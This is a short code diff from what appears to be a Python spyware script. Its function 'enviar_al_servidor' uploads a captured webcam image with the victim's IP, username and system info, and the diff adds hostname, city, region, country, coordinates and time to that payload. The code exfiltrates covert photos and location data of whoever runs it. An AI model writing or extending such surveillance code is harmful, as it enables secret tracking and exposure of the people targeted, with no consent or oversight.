@@ -75,9 +75,15 @@ def enviar_al_servidor(info, archivos):
         with open(archivos["webcam"], "rb") as img_file:
             files = {"image": img_file}
             data = {
-                "ip": info["ip"],
-                "username": info["username"],
-                "system_info": info["system_info"]
+                "ip": info.get("ip", "No recibido"),
+                "username": info.get("username", "No recibido"),
+                "system_info": info.get("system_info", "No recibido"),
+                "hostname": info.get("hostname", "N/A"),
+                "ciudad": info.get("ciudad", "N/A"),
+                "region": info.get("region", "N/A"),
+                "pais": info.get("pais", "N/A"),
+                "loc": info.get("loc", "N/A"),
+                "hora": info.get("hora", "N/A")
             }
             print("[*] Enviando al servidor...")
             print("  Payload:", data)
